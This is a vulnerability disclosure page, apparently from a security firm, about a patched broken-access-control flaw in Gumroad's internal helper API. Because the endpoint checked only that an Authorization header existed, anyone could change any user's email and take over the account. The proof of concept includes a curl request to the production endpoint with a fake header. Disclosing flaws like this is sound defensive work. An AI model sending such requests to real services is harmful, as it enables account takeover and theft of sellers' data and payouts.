---
schema_version: "1.0.0"
document_id: "d6dde0c531dc55798a51cfaebb3fa42b0e865701eae9a07f37971d8bad5ad8f0"
company_key: "yc-winfunc"
company: "winfunc"
source_id: "yc-winfunc-rss-7ebe4d6da681"
canonical_url: "https://winfunc.com/hacktivity/gumroad-helper-auth-bypass-ato"
published_at: "2025-01-01T00:00:00+00:00"
first_seen_at: "2026-07-20T23:21:05.938183+00:00"
fetched_at: "2026-07-28T20:58:25.712310+00:00"
content_hash: "sha256:93c718877ebdb6460bc2e5b39850a4d6ec7b019c90d3162a82bcd99229e6d364"
---

# 0-click Account Takeover and Admin Operations via helper endpoint authorization bypass

[Back to Hacktivity](https://winfunc.com/hacktivity)


### Status: Patched


This vulnerability has been verified as resolved and deployed.


Gumroad


Critical


2025


# 0-click Account Takeover and Admin Operations via helper endpoint authorization bypass


## Summary


Broken Access Control allows unauthenticated email updates via Helper API


The helper endpoint responsible for updating user email addresses performs a sensitive account mutation without performing any authentication or authorization beyond confirming that an` Authorization` header exists.` Api::Internal::Helper::BaseController#verify_authorization_header!` only checks for the header’s presence and does not enforce a signature, token, or identity check unless an action explicitly invokes` authorize_hmac_signature!` or` authorize_helper_token!` . The` UsersController` never calls either method, leaving` POST /api/internal/helper/users/update_email` callable by any unauthenticated client that supplies an arbitrary header (e.g.,` Authorization: foo` ).


An attacker can submit` current_email` and` new_email` parameters for any account, causing the controller to look up the target user via` User.alive.by_email` and set` user.email = params\[:new_email\]` with no ownership verification. Persisting the change allows the attacker to initiate password resets to the new email address, effectively taking over the victim’s account. This is a direct broken access control vulnerability with high impact on account integrity and confidentiality.


### CVSS Score


Vector


N


Complexity


L


Privileges


N


User Interaction


N


Scope


U


Confidentiality


L


Integrity


H


Availability


L


CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:H/A:L


### Vulnerability Location


Source


Line 247


app /controllers


/api


/internal


/helper


/users_controller.rb


update_email


Sink


Line 258


app /controllers


/api


/internal


/helper


/users_controller.rb


update_email


## Source-to-Sink Analysis


1


app/controllers/api/internal/helper/users_controller.rb:258


User lookup is driven directly by attacker-controlled` current_email` .


RUBY


```text
user =  User  .alive.by_email(params[ :current_email  ]).first


```


2


app/controllers/api/internal/helper/users_controller.rb:260


Attacker-controlled` new_email` is assigned to victim user without ownership checks.


RUBY


```text
user.email = params[ :new_email  ]


```


3


app/controllers/api/internal/helper/users_controller.rb:261


Saving persists the unauthorized email change.


RUBY


```text
if   user.save


```


4


app/controllers/api/internal/helper/users_controller.rb:262


Controller confirms success to attacker, completing takeover path.


RUBY


```text
render  json:   {  message:    "Email updated."   }


```


## Impact Analysis


### Critical Impact


Full account takeover, access to private sales data, payout redirection, customer records, and ability to impersonate the victim. Attack is remote, unauthenticated, and repeatable.


### Attack Surface


Publicly accessible API endpoint` /api/internal/helper/users/update_email` on` api.gumroad.com` .


### Preconditions


Network access to the API endpoint. No valid credentials or secrets are required—only an` Authorization` header with any arbitrary value.


## Proof of Concept


### Environment Setup


Requirements: OS: Ubuntu 22.04 LTS or macOS 14. Packages:` git ruby-full nodejs npm postgresql curl jq` .


Clone & Install:


BASH


```text
git  clone   https://github.com/antiwork/gumroad.git
cd   gumroad
bundle install
npm install


```


Database & Secrets:


BASH


```text
bin/rails db:setup
cp   .env.example .env.development
# ensure HELPERS tokens are set if needed for app boot


```


### Target Configuration


Start the Rails server:


BASH


```text
bin/rails server -p 3000


```


Ensure a test user exists (replace with real email in production):


BASH


```text
bin/rails console
User.create!(email:  " [email protected]  "  , password:  "Password1"  , name:  "Victim"  , confirmed_at: Time.current)
exit


```


### Exploit Delivery


Because the endpoint only checks for header presence, any arbitrary value suffices.


BASH


```text
curl -X POST  'https://api.gumroad.com/internal/helper/users/update_email'   \
-H  'Authorization: totally-fake'   \
-H  'Content-Type: application/json'   \
-d  '{
"current_email": " [email protected]  ",
"new_email": " [email protected]  "
}'


```


### Outcome


The attacker gains full control over the victim’s Gumroad account by hijacking the email address and resetting the password, compromising confidential data and payouts.


**Expected Response:**


JSON


```text
{  "message"  :  "Email updated."  }


```


## Run this level of analysis on your repo.


Winfunc traces source-to-sink paths, validates exploitability, and gives your team patch-ready remediation.


[Vulnerability Detection](https://winfunc.com/products/scanner/vulnerability-detection)


[View Patch PR Verify fix on GitHub](https://github.com/antiwork/gumroad/pull/2098)
